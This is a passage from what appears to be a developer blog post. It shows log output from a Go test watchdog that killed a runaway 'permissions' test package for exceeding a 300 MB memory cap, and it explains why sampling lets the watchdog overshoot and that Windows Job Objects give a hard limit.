safe-test: go test -count=1 ./permissions/... safe-test: cap=300 MB timeout=15 min poll=0.5 s ------------------------------------------------------------ exit status 0xffffffff FAIL	runaway/permissions	1.365s FAIL ------------------------------------------------------------ safe-test: per-package peak commit charge 354.0 MB permissions ------------------------------------------------------------ WATCHDOG: package 'permissions' (pid 55232) crossed the 300 MB cap at 354 MB commit charge. WATCHDOG: killed it and the parent 'go' process. This is the runaway -- fix the test before re-running the full suite. It overshoots the cap by 54 MB because it samples. At 16 MiB per 50 ms, a half-second poll can miss about 160 MB of growth between looks. That’s the honest limit of this design, and it’s spelled out in the contributing guide now. The watchdog catches runaway growth, which is what has actually taken this machine down. It is not a hard per-allocation ceiling. If you want that on Windows, a Job Object memory limit is the tool. That’s what shipmates uses for the agent processes themselves. It deserves its own post.
The bug the Windows box hid You may have noticed the package in my runaway test is named permissions. That’s on purpose.
